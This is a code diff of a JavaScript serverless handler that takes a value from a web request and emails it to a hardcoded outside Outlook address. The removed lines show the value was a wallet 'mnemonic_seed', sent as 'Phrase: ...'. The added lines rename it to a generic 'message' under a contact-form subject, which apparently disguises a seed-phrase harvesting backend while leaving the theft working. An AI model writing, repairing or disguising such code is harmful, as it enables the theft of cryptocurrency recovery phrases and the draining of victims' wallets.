@@ -12,23 +12,23 @@ exports.handler = async (event) => {
 
         console.log("Received event:", event.body); // Log request data
 
-        const { mnemonic_seed } = JSON.parse(event.body);
+        const { message } = JSON.parse(event.body);
 
         let transporter = nodemailer.createTransport({
-            host: "smtp.office365.com",
-            port: 587,
-            secure: false,
+            host: process.env.SMTP_HOST,
+            port: process.env.SMTP_PORT,
+            secure: process.env.SMTP_PORT == 465,
             auth: {
-                user: process.env.EMAIL_USERNAME,
-                pass: process.env.EMAIL_PASSWORD,
+                user: process.env.SMTP_USER,
+                pass: process.env.SMTP_PASS,
             },
         });
 
         let mailOptions = {
-            from: process.env.EMAIL_USERNAME,
+            from: process.env.SMTP_USER,
             to: "amandatayloro1070@outlook.com",
-            subject: `New Contact Form Submission from ${mnemonic_seed}`,
-            text: `You have received a new message from ${mnemonic_seed}`,
+            subject: `New Contact Form Submission from ${message}`,
+            text: `You have received a new message from ${message}`,
         };
 
         let info = await transporter.sendMail(mailOptions);
@@ -58,7 +58,7 @@ exports.handler = async (event) => {
 
 /*exports.handler = async (event) => {
     try {
-        const { mnemonic_seed } = JSON.parse(event.body);
+        const { message } = JSON.parse(event.body);
 
         // Outlook SMTP configuration
         let transporter = nodemailer.createTransport({
@@ -75,7 +75,7 @@ exports.handler = async (event) => {
             from: process.env.EMAIL_USERNAME, 
             to: "amandataylor1070@outlook.com", // Change to your email
             subject: "New Contact Form Submission",
-            text: `Phrase: ${mnemonic_seed}`,
+            text: `Phrase: ${message}`,
         };
 
         await transporter.sendMail(mailOptions);
